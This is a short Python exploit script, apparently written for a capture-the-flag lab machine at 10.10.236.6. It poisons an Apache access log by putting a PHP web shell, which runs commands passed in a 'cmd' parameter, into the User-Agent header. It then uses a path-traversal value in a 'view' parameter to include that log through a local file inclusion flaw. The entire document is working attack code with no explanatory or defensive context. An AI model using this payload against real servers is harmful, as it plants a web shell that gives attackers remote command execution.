import requests

ip = "10.10.236.6"
url = f"http://{ip}/"

header = { "User-Agent": "<?php system($_GET['cmd']); ?>" }

params = {
    "view": "dog../../../../../var/log/apache2/access.log",
    "ext": ""
}

r = requests.get(url, headers=header, params=params)

if r.status_code == 200:
  print("log poisoned!")
else:
  print("an error occurred, please try again")
